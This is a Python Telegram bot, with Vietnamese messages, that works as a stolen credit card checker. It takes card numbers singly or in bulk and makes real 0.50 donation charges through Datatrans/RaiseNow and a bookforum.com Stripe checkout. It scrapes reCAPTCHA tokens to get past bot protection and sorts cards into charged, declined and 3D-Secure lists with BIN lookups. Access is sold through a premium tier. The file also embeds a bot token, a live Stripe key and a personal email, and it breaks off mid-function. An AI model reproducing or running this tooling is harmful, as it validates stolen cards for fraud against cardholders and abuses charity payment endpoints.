import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
import sys
from datetime import datetime
from pytz import timezone
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Cáº¤U HÃŒNH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- TÃŠN FILE & THÆ¯ Má»¤C LÆ¯U TRá»® ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json"
STATS_FILE = "user_stats.json"
PREFS_FILE = "user_prefs.json"
LOG_DIR = "check_logs"
CONFIG_FILE = "bot_config.json"

# --- GIá»šI Háº N Máº¶C Äá»ŠNH CHO THÃ€NH VIÃŠN ---
DEFAULT_MEMBER_LIMIT = 100
MEMBER_THREAD_LIMIT = 3

# --- Cáº¤U HÃŒNH MÃšI GIá»œ ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- BIáº¾N TOÃ€N Cá»¤C Äá»‚ THEO DÃ•I TÃC Vá»¤ ÄANG CHáº Y ---
ACTIVE_CHECKS = set()

# --- Cáº¤U HÃŒNH LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KHá»I Táº O ---
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "gate_1"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "gate_2"), exist_ok=True)

# --- QUáº¢N LÃ Cáº¤U HÃŒNH & DATA ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(default_data, f, indent=4)
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            # Handle empty file case
            if os.path.getsize(filename) == 0:
                return default_data
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_config():
    return load_json_file(CONFIG_FILE, default_data={"active_gate": 1, "bot_on": True})

def save_config(data):
    save_json_file(CONFIG_FILE, data)

def load_users():
    try:
        if not os.path.exists(USER_FILE):
            return set()
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE, {})
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_lang(user_id):
    prefs = load_json_file(PREFS_FILE, {})
    return prefs.get(str(user_id), None)

def set_user_lang(user_id, lang_code):
    prefs = load_json_file(PREFS_FILE, {})
    prefs[str(user_id)] = lang_code
    save_json_file(PREFS_FILE, prefs)

def update_user_stats(user_id, user_info, counts, gate_num):
    stats = load_json_file(STATS_FILE, {})
    user_id_str = str(user_id)
    gate_key = f"gate_{gate_num}"
    
    if user_id_str not in stats:
        stats[user_id_str] = {}
    if gate_key not in stats[user_id_str]:
        stats[user_id_str][gate_key] = {
            'username': user_info.username,
            'full_name': user_info.full_name,
            'total_charged': 0,
            'total_custom': 0,
            'total_decline': 0,
            'total_error': 0,
            'total_invalid': 0,
            'last_check_timestamp': ''
        }
    
    # Ensure all keys exist before incrementing
    for key in ['total_charged', 'total_custom', 'total_decline', 'total_error', 'total_invalid']:
        if key not in stats[user_id_str][gate_key]:
            stats[user_id_str][gate_key][key] = 0

    stats[user_id_str][gate_key]['total_charged'] += counts.get('success', 0)
    stats[user_id_str][gate_key]['total_custom'] += counts.get('custom', 0)
    stats[user_id_str][gate_key]['total_decline'] += counts.get('decline', 0)
    stats[user_id_str][gate_key]['total_error'] += counts.get('error', 0)
    stats[user_id_str][gate_key]['total_invalid'] += counts.get('invalid_format', 0)
    stats[user_id_str][gate_key]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
    save_json_file(STATS_FILE, stats)

# --- CÃC HÃ€M Cá»T LÃ•I ---
def make_request_with_retry(session, method, url, max_retries=10, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            time.sleep(attempt + 1)
    return None, f"Táº¥t cáº£ {max_retries} láº§n thá»­ láº¡i Ä‘á»u tháº¥t báº¡i. Lá»—i cuá»‘i cÃ¹ng: {last_exception}"

def get_bin_info(session, cc):
    bin_info = {}
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    try:
        bin_response, error = make_request_with_retry(session, 'get', f"https://bins.antipublic.cc/bins/{cc[:6]}", headers={"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}, timeout=10)
        if not error and bin_response.status_code == 200 and "not found" not in bin_response.text:
            bin_info.update(bin_response.json())
    except Exception as e:
        logger.error(f"Lá»—i kiá»ƒm tra BIN: {e}", exc_info=True)
    return bin_info

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19): return False, "Sá»‘ tháº» (CC) pháº£i cÃ³ tá»« 10-19 chá»¯ sá»‘."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12): return False, "ThÃ¡ng (MM) pháº£i lÃ  sá»‘ tá»« 1 Ä‘áº¿n 12."
    if not (ano.isdigit() and len(ano) in [2, 4]): return False, "NÄƒm (YY) pháº£i cÃ³ 2 hoáº·c 4 chá»¯ sá»‘."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4): return False, "CVV pháº£i cÃ³ 3 hoáº·c 4 chá»¯ sá»‘."
    return True, ""

def parse_card_line(line):
    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""
    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part, date_split[0].strip(), date_split[1].strip(), cvv_part
            else: return None, "Äá»‹nh dáº¡ng ngÃ y thÃ¡ng khÃ´ng há»£p lá»‡ (mm/yy)."
        else: return None, "Thiáº¿u dáº¥u '/' trong pháº§n ngÃ y thÃ¡ng."
    else: return None, "DÃ²ng pháº£i cÃ³ dáº¡ng cc|mm|yy|cvv hoáº·c cc|mm/yy|cvv."
    
    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid: return None, error_message
    
    if len(ano) == 2: ano = f"20{ano}"
    return (cc, mes, ano, cvv), None

def check_card_gate1(line):
    GATEWAY_NAME = "Charge 0.5$ New Api"
    card_details, error = parse_card_line(line)
    if error: return 'invalid_format', line, error, {}, GATEWAY_NAME

    cc, mes, ano, cvv = card_details
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    bin_info = get_bin_info(session, cc)
    try:
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, timeout=15)
        if error: return 'error', line, f"Lá»—i Tokenize: {error}", bin_info, GATEWAY_NAME
        
        token_data = token_response.json()
        transaction_id = token_data.get("transactionId")
        if not transaction_id: return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info, GATEWAY_NAME
        
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com"}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, timeout=20)
        if error: return 'error', line, f"Lá»—i Payment: {error}", bin_info, GATEWAY_NAME

        response_text = payment_response.text
        if '"payment_status":"succeeded"' in response_text: return 'success', line, "Transaction successful!", bin_info, GATEWAY_NAME
        if '"payment_status":"failed"' in response_text: return 'decline', line, "Transaction declined", bin_info, GATEWAY_NAME
        if '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text: return 'custom', line, "3D Secure Required", bin_info, GATEWAY_NAME
        return 'unknown', line, response_text, bin_info, GATEWAY_NAME
    except Exception as e: return 'error', line, f"Lá»—i há»‡ thá»‘ng: {e}", bin_info, GATEWAY_NAME

def solve_recaptcha_gate2(session):
    try:
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lf1lR0qAAAAAETSPs7KD79dC4DPVTFu8OOWLYX9&co=aHR0cHM6Ly9zdWJzY3JpcHRpb25zLmJvb2tmb3J1bS5jb206NDQz&hl=vi&v=_cn5mBoBXIA0_T7xBjxkUqUA&size=invisible&cb=aov1eimb2rcc"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}
        anchor_res, error = make_request_with_retry(session, 'get', anchor_url, headers=headers, timeout=15)
        if error: return None, f"Recaptcha-Anchor: {error}"
        
        token_match = re.search(r'id="recaptcha-token" value="([^"]+)"', anchor_res.text)
        if not token_match: return None, "Recaptcha-Token not found"
        
        reload_url = "https://www.google.com/recaptcha/api2/reload?k=6Lf1lR0qAAAAAETSPs7KD79dC4DPVTFu8OOWLYX9"
        reload_payload = f"v=_cn5mBoBXIA0_T7xBjxkUqUA&reason=q&c={token_match.group(1)}&k=6Lf1lR0qAAAAAETSPs7KD79dC4DPVTFu8OOWLYX9&co=aHR0cHM6Ly9zdWJzY3JpcHRpb25zLmJvb2tmb3J1bS5jb206NDQz&hl=en&size=invisible"
        reload_res, error = make_request_with_retry(session, 'post', reload_url, headers={'Content-Type': 'application/x-www-form-urlencoded', **headers}, data=reload_payload, timeout=15)
        if error: return None, f"Recaptcha-Reload: {error}"

        cap_match = re.search(r'\["rresp","([^"]+)"\]', reload_res.text)
        if not cap_match: return None, "Recaptcha-Key (rresp) not found"
        return cap_match.group(1), None
    except Exception as e: return None, f"Exception in Recaptcha: {e}"

def check_card_gate2(line):
    GATEWAY_NAME = "Charge 0.5$ Stripe"
    card_details, error = parse_card_line(line)
    if error: return 'invalid_format', line, error, {}, GATEWAY_NAME

    cc, mes, ano, cvv = card_details
    session = requests.Session()
    session.headers.update({"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"})
    bin_info = get_bin_info(session, cc)
    try:
        captcha_key, error = solve_recaptcha_gate2(session)
        if error: return 'error', line, f"Lá»—i Captcha: {error}", bin_info, GATEWAY_NAME

        checkout_url = f"https://subscriptions.bookforum.com/api/checkout?captcha={captcha_key}"
        checkout_payload = {"event":{"cart":{"items":[],"giftsubs":[],"donation":{"process":"onetime","amount":50},"subscription":None}},"form":{"name":"Minh Nhat","email":"minhnhat.144417@gmail.com","address":{"line1":"2830 Oakridge Farm Lane","city":"West Allis","postcode":"53227","country":"US"},"origin":"donate-page"}}
        checkout_res, error = make_request_with_retry(session, 'post', checkout_url, json=checkout_payload, timeout=20)
        if error: return 'error', line, f"Lá»—i Checkout: {error}", bin_info, GATEWAY_NAME
        
        checkout_data = checkout_res.json()
        intent_id, client_secret = checkout_data.get("payment_intent_id"), checkout_data.get("stripe_secret")
        if not intent_id or not client_secret: return 'error', line, f"KhÃ´ng láº¥y Ä‘Æ°á»£c Intent/Secret: {checkout_res.text}", bin_info, GATEWAY_NAME
        
        confirm_url = f"https://api.stripe.com/v1/payment_intents/{intent_id}/confirm"
        confirm_payload = f"return_url=https%3A%2F%2Fsubscriptions.bookforum.com%2Fdonate&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&key=pk_live_51N5VPQHMj9WRjRZttfGty42dIdzXaX9M9aWxisN65OCzhjnqCJew1tEZzfN2oGx1rljGg2PBZvcr1W9Q7H1o7iMD00DPMAWlp4&client_secret={client_secret}"
        confirm_res, error = make_request_with_retry(session, 'post', confirm_url, headers={"content-type": "application/x-www-form-urlencoded"}, data=confirm_payload, timeout=20)
        if error: return 'error', line, f"Lá»—i Confirm Stripe: {error}", bin_info, GATEWAY_NAME
        
        response_text = confirm_res.text
        decline_message = "Declined"
        try:
            error_data = confirm_res.json().get("error", {})
            decline_message = error_data.get("decline_code") or error_data.get("code") or error_data.get("message", decline_message)
        except json.JSONDecodeError: pass

        if '"status": "succeeded"' in response_text: return 'success', line, "Transaction successful!", bin_info, GATEWAY_NAME
        if '"status": "requires_action"' in response_text or '"status": "requires_source_action"' in response_text: return 'custom', line, "3D Secure Required", bin_info, GATEWAY_NAME
        if "insufficient_funds" in response_text or "Your card has insufficient funds" in response_text: return 'decline', line, "insufficient_funds", bin_info, GATEWAY_NAME
        
        return 'decline', line, decline_message, bin_info, GATEWAY_NAME

    except Exception as e: return 'error', line, f"Lá»—i há»‡ thá»‘ng: {e}", bin_info, GATEWAY_NAME

def check_card(line):
    gate = load_config().get("active_gate", 1)
    if gate == 2:
        return check_card_gate2(line)
    return check_card_gate1(line)

def create_progress_bar(current, total, length=10):
    if total == 0: return "[                      ] 0%"
    fraction = current / total
    bar = 'â–ˆ' * int(length * fraction) + 'â–‘' * (length - int(length * fraction))
    return f"[{bar}] {int(fraction * 100)}%"

# --- CÃC HÃ€M TIá»†N ÃCH BOT ---
async def check_maintenance_mode(update: telegram.Update) -> bool:
    # Bá» qua check cho admin
    if update.effective_user and update.effective_user.id == ADMIN_ID:
        return False
    
    config = load_config()
    if not config.get("bot_on", True):
        if update.message:
            await update.message.reply_text("ğŸ› ï¸ Bot Ä‘ang trong cháº¿ Ä‘á»™ báº£o trÃ¬. Vui lÃ²ng thá»­ láº¡i sau. ğŸ› ï¸")
        return True
    return False

# --- CÃC Lá»†NH BOT ---
async def start(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    user = update.effective_user
    if user.id in load_users() or user.id == ADMIN_ID:
        await update.message.reply_text(f"**ChÃ o má»«ng trá»Ÿ láº¡i, {user.first_name}!**\nDÃ¹ng /help Ä‘á»ƒ xem cÃ¡c lá»‡nh.")
    else:
        await update.message.reply_text(f"**Welcome!** ğŸ¤–\nYour Telegram ID: `{user.id}`\nContact {ADMIN_USERNAME} to get access.")

async def info(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    await update.message.reply_text(f"ğŸ†” ID Telegram cá»§a báº¡n lÃ : `{update.effective_user.id}`")

async def get_help_text(user_id, lang_code):
    user_limit = get_user_limit(user_id)
    admin_commands = ("**Báº£ng Lá»‡nh Quáº£n Trá»‹ ViÃªn** ğŸ‘‘\n"
                      "ToÃ n quyá»n quáº£n lÃ½ bot vá»›i cÃ¡c lá»‡nh sau:\n\n"
                      "**Quáº£n lÃ½ Tráº¡ng thÃ¡i & Cá»•ng:**\n"
                      "ğŸ”¹ `/on` - Báº­t bot cho ngÆ°á»i dÃ¹ng.\n"
                      "ğŸ”¹ `/off` - Táº¯t bot (cháº¿ Ä‘á»™ báº£o trÃ¬).\n"
                      "ğŸ”¹ `/rs` - Khá»Ÿi Ä‘á»™ng láº¡i bot.\n"
                      "ğŸ”¹ `/gate <1|2>` - Chá»n cá»•ng check (máº·c Ä‘á»‹nh: 1).\n\n"
                      "**Quáº£n lÃ½ User & Giá»›i háº¡n:**\n"
                      "ğŸ”¹ `/add <user_id>` - Cho phÃ©p user sá»­ dá»¥ng bot.\n"
                      "ğŸ”¹ `/ban <user_id>` - XÃ³a quyá»n truy cáº­p cá»§a user.\n"
                      "ğŸ”¹ `/show` - Hiá»ƒn thá»‹ danh sÃ¡ch user vÃ  háº¡n má»©c.\n"
                      "ğŸ”¹ `/addlimit <user_id> <sá»‘>` - Cá»™ng thÃªm giá»›i háº¡n check.\n\n"
                      "**GiÃ¡m sÃ¡t & Lá»‹ch sá»­:**\n"
                      "ğŸ”¹ `/showcheck` - Xem thá»‘ng kÃª hoáº¡t Ä‘á»™ng cá»§a táº¥t cáº£ user.\n"
                      "ğŸ”¹ `/lootfile <user_id>` - Xem vÃ  táº£i láº¡i lá»‹ch sá»­ check file.")
    
    member_commands = ("**Báº£ng Lá»‡nh ThÃ nh ViÃªn** ğŸ‘¤\n"
                       "Báº¡n Ä‘Ã£ Ä‘Æ°á»£c cáº¥p quyá»n! Sá»­ dá»¥ng cÃ¡c lá»‡nh sau Ä‘á»ƒ check tháº»:\n\n"
                       "ğŸ”¹ `/cs <tháº»>`\n"
                       "   - *MÃ´ táº£:* Kiá»ƒm tra má»™t tháº» tÃ­n dá»¥ng duy nháº¥t.\n"
                       "   - *Äá»‹nh dáº¡ng:* `Sá»‘ tháº»|ThÃ¡ng|NÄƒm|CVV` hoáº·c `Sá»‘ tháº»|ThÃ¡ng/NÄƒm|CVV`\n"
                       "   - *VÃ­ dá»¥:* `/cs 4031630741125602|11/2028|123`\n\n"
                       "ğŸ”¹ `/mass<sá»‘ luá»“ng> <file.txt>`\n"
                       "   - *MÃ´ táº£:* Kiá»ƒm tra hÃ ng loáº¡t tháº» tá»« má»™t tá»‡p `.txt`.\n"
                       "   - *VÃ­ dá»¥:* Gá»­i file vÃ  ghi caption lÃ  `/mass3` Ä‘á»ƒ cháº¡y 3 luá»“ng.\n\n"
                       f"ğŸ’³ **Háº¡n má»©c cá»§a báº¡n:** `{user_limit}` lines/file.\n"
                       f"ğŸŒŸ **NÃ¢ng cáº¥p Premium:** LiÃªn há»‡ {ADMIN_USERNAME} Ä‘á»ƒ check khÃ´ng giá»›i háº¡n.")
    
    public_commands = ("**Báº£ng Lá»‡nh CÃ´ng Khai** ğŸ› ï¸\n"
                       "ChÃ o má»«ng báº¡n! DÆ°á»›i Ä‘Ã¢y lÃ  cÃ¡c lá»‡nh cÆ¡ báº£n báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng:\n\n"
                       "ğŸ”¹ `/start` - Khá»Ÿi Ä‘á»™ng bot vÃ  nháº­n ID Telegram.\n"
                       "ğŸ”¹ `/info` - Láº¥y láº¡i ID Telegram.\n"
                       "ğŸ”¹ `/help` - Hiá»ƒn thá»‹ báº£ng trá»£ giÃºp nÃ y.\n\n"
                       f"**NÃ¢ng cáº¥p Premium:**\nÄá»ƒ sá»­ dá»¥ng cÃ¡c tÃ­nh nÄƒng check khÃ´ng giá»›i háº¡n, vui lÃ²ng liÃªn há»‡ Admin: {ADMIN_USERNAME}")

    if user_id == ADMIN_ID:
        return f"{admin_commands}\n\n{member_commands.split('ğŸ’³ **Háº¡n má»©c cá»§a báº¡n:**')[0].strip()}"
    elif user_id in load_users():
        return f"{member_commands}\n\n{public_commands}"
    else:
        return public_commands

async def help_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    help_text = await get_help_text(update.effective_user.id, 'vi')
    await update.message.reply_text(help_text, disable_web_page_preview=True)

async def cs_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        return

    if not context.args:
        await update.message.reply_text("Sá»­ dá»¥ng: `/cs cc|mm|yy|cvv` hoáº·c `/cs cc|mm/yy|cvv`")
        return
    
    line = " ".join(context.args)
    msg = await update.message.reply_text("â³ *Checking your card, please wait...*")
    try:
        status, original_line, full_response, bin_info, gateway_name = await asyncio.to_thread(check_card, line)
        
        status_text = "â” UNKNOWN"
        if status == 'success':
            status_text = "âœ… CHARGED 0.5$" if "Stripe" in gateway_name else "âœ… CHARGED"
        elif status == 'decline': status_text = "âŒ DECLINED"
        elif status == 'custom': status_text = "ğŸ”’ 3D SECURE"
        elif status == 'invalid_format': status_text = "ğŸ“‹ FORMAT ERROR"
        elif status == 'error': status_text = "â—ï¸ ERROR"

        bin_str = (f"`{bin_info.get('bank', 'N/A')}`\n*- Country:* `{bin_info.get('country_name', 'N/A')}`\n*- Type:* `{bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')}`")
        final_message = (f"**ğŸ’  CARD CHECK RESULT ğŸ’ **\n\n"
                         f"**ğŸ’³ Card:** `{original_line}`\n"
                         f"**ğŸš¦ Status: {status_text}**\n"
                         f"**ğŸ’¬ Response:** `{full_response}`\n\n"
                         f"**ğŸ¦ Gateway:** `{gateway_name}`\n\n"
                         f"**â„¹ï¸ BIN Info:**\n{bin_str}\n\n"
                         f"ğŸ‘¤ *Checker by: {ADMIN_USERNAME}*")
        await msg.edit_text(final_message)
    except Exception as e:
        logger.error(f"Lá»—i trong /cs: {e}", exc_info=True)
        await msg.edit_text(f"â›”ï¸ **System Error:** `{e}`")

async def mass_check_handler(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    user = update.effective_user
    if user.id != ADMIN_ID and user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to start a new check while one is already running.")
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"âš ï¸ **Cáº£nh bÃ¡o Spam** âš ï¸\n\nThÃ nh viÃªn `{user.id}` ({user.full_name or 'N/A'}) Ä‘ang cá»‘ gáº¯ng gá»­i file má»›i trong khi tÃ¡c vá»¥ khÃ¡c Ä‘ang cháº¡y.")
        return
    if user.id != ADMIN_ID and user.id not in load_users(): return
    if not update.message.document or not update.message.document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("Vui lÃ²ng Ä‘Ã­nh kÃ¨m má»™t tá»‡p .txt")
        return
    
    file = await context.bot.get_file(update.message.document.file_id)
    lines = [line for line in (await file.download_as_bytearray()).decode('utf-8').splitlines() if line.strip()]
    total_lines = len(lines)
    if not lines:
        await update.message.reply_text("ğŸ“‚ Tá»‡p trá»‘ng.")
        return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(f"â›”ï¸ **VÆ°á»£t quÃ¡ giá»›i háº¡n!**\nTá»‡p cá»§a báº¡n cÃ³ `{total_lines}` dÃ²ng, nhÆ°ng giá»›i háº¡n lÃ  `{user_limit}` dÃ²ng.")
            return

    gate_num = load_config().get("active_gate", 1)
    caption = update.message.caption or "/mass"
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match else 10
    num_threads = min(requested_threads, MEMBER_THREAD_LIMIT) if user.id != ADMIN_ID else min(50, requested_threads)
    
    session_dir = os.path.join(LOG_DIR, f"gate_{gate_num}", str(user.id), datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S"))
    os.makedirs(session_dir, exist_ok=True)
    status_message = await update.message.reply_text(f"â³ Khá»Ÿi táº¡o Gate {gate_num}... Äang kiá»ƒm tra `{total_lines}` tháº» vá»›i `{num_threads}` luá»“ng.")
    
    try:
        if user.id != ADMIN_ID: ACTIVE_CHECKS.add(user.id)
        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0}
        result_lists = {k: [] for k in counts.keys()}
        processed_count, last_update_time = 0, time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                status, original_line, full_response, bin_info, _ = future.result()
                
                # Ensure status is a valid key
                if status not in counts:
                    status = 'unknown'

                counts[status] += 1
                bin_str = f"| {bin_info.get('bank', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} - {bin_info.get('country_name', 'N/A')}"
                line_to_save = f"{original_line} {bin_str} | Response: {full_response}"
                result_lists[status].append(line_to_save)
                
                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (f"**ğŸš€ Checking in progress...**\n{progress_bar}\n"
                                   f"**Progress:** `{processed_count}/{total_lines}` | **Threads:** `{num_threads}`\n\n"
                                   f"âœ… **Charged:** `{counts['success']}`\nâŒ **Declined:** `{counts['decline']}`\n"
                                   f"ğŸ”’ **3D Secure:** `{counts['custom']}`\nğŸ“‹ **Invalid:** `{counts['invalid_format']}`\n"
                                   f"â” **Errors:** `{counts['error'] + counts['unknown']}`")
                    try:
                        await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest:
                        pass
                    last_update_time = time.time()
        
        await status_message.edit_text(f"**ğŸ“Š Check Complete!**\n\n(Káº¿t quáº£ sáº½ Ä‘Æ°á»£c gá»­i dÆ°á»›i dáº¡ng tá»‡p tin)")
        update_user_stats(user.id, user, counts, gate_num)

        file_map = {'success': 'charged.txt', 'decline': 'declined.txt', 'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt', 'error': 'errors.txt', 'unknown': 'unknown.txt'}
        for status, filename in file_map.items():
            if result_lists.get(status):
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(result_lists[status]))
                await context.bot.send_document(chat_id=update.effective_chat.id, document=open(file_path, 'rb'))
    except Exception as e:
        logger.error(f"Lá»—i trong mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"â›”ï¸ **Lá»—i nghiÃªm trá»ng!** `{e}`")
    finally:
        if user.id != ADMIN_ID: ACTIVE_CHECKS.discard(user.id)


# --- Lá»†NH ADMIN ---
async def on_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    config = load_config()
    config["bot_on"] = True
    save_config(config)
    await update.message.reply_text("âœ… Bot Ä‘Ã£ Ä‘Æ°á»£c báº­t. NgÆ°á»i dÃ¹ng cÃ³ thá»ƒ sá»­ dá»¥ng cÃ¡c lá»‡nh.")

async def off_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    config = load_config()
    config["bot_on"] = False
    save_config(config)
    await update.message.reply_text("âŒ Bot Ä‘Ã£ Ä‘Æ°á»£c táº¯t (cháº¿ Ä‘á»™ báº£o trÃ¬). Chá»‰ admin cÃ³ thá»ƒ sá»­ dá»¥ng.")

async def reset_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("ğŸ”„ Bot Ä‘ang khá»Ÿi Ä‘á»™ng láº¡i...")
    # Cleanly close the current application instance before restarting
    await context.application.shutdown()
    os.execv(sys.executable, ['python'] + sys.argv)

async def gate_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    config = load_config()
    current_gate = config.get("active_gate", 1)
    if not context.args:
        await update.message.reply_text(f"CÃº phÃ¡p: `/gate <1|2>`\nCá»•ng hiá»‡n táº¡i: **Gate {current_gate}**.")
        return
    try:
        new_gate = int(context.args[0])
        if new_gate not in [1, 2]: raise ValueError
        config["active_gate"] = new_gate
        save_config(config)
        await update.message.reply_text(f"âœ… ÄÃ£ chuyá»ƒn sang **Gate {new_gate}** thÃ nh cÃ´ng!")
    except (ValueError, IndexError):
        await update.message.reply_text(f"âŒ Lá»—i: Vui lÃ²ng chá»n `1` hoáº·c `2`.")

async def show_check_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE, {})
    if not stats:
        await update.message.reply_text("ChÆ°a cÃ³ dá»¯ liá»‡u thá»‘ng kÃª.")
        return
    
    message = "ğŸ“Š **THá»NG KÃŠ CHECK Cá»¦A USER** ğŸ“Š\n\n"
    all_users = load_users()
    all_users.add(ADMIN_ID)
    
    for user_id in sorted(list(all_users)):
        user_id_str = str(user_id)
        user_data = stats.get(user_id_str, {})
        
        # Try to get user info from any available gate data
        user_info = {}
        if "gate_1" in user_data:
            user_info = user_data["gate_1"]
        elif "gate_2" in user_data:
            user_info = user_data["gate_2"]
            
        user_display = f"@{user_info.get('username')}" if user_info.get('username') else f"ID: {user_id_str}"
        message += f"ğŸ‘¤ **{user_display}** (`{user_id_str}`)\n"
        
        if not user_data:
            message += "  *ChÆ°a tá»«ng check.*\n"
        else:
            has_data = False
            for i in [1, 2]:
                gate_key = f"gate_{i}"
                data = user_data.get(gate_key)
                if data:
                    has_data = True
